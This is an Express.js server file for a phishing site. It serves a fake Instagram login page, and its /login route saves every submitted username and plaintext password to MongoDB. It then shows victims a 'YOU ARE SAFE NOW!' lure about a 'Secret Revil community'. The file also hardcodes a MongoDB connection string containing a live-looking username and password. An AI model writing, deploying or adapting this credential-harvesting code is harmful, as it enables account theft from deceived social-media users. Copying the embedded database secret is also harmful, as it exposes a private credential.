const express = require("express");
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

// Middleware to parse URL-encoded and JSON bodies
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, "public")));

// Connect to MongoDB
mongoose.connect("mongodb+srv://afshankhan:afshan123@cluster0.agrjukf.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0", {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error:"));
db.once("open", () => {
  console.log("Connected to MongoDB");
});

// Define User Schema
const userSchema = new mongoose.Schema({
  username: String,
  password: String,
});

const User = mongoose.model("User", userSchema);

// Routes

// Serve the landing page as the main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "landing.html"));
});

// Serve the Instagram login page
app.get("/instagram-login", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Handle login
app.post("/login", async (req, res) => {
  console.log("POST /login");
  console.log("Request Body:", req.body);

  const { username, password } = req.body;

  try {
    if (!username || !password) {
      return res.status(400).send("Username and password are required");
    }

    const newUser = new User({ username, password });
    await newUser.save();
    
    // Redirect to a success page or show success message
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Success</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
          }
          .success-box {
            background: white;
            padding: 40px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
          }
          h1 {
            color: #667eea;
            margin-bottom: 20px;
          }
          p {
            color: #666;
            font-size: 1.1em;
          }
        </style>
      </head>
      <body>
        <div class="success-box">
          <h1>✅ YOU ARE SAFE NOW!</h1>
          <p>Welcome to the Secret Revil community!</p>
          <p>Check your Instagram DMs for the private group link.</p>
        </div>
      </body>
      </html>
    `);
  } catch (err) {
    console.error("Error saving user:", err);
    return res.status(500).send("Error saving user to database");
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});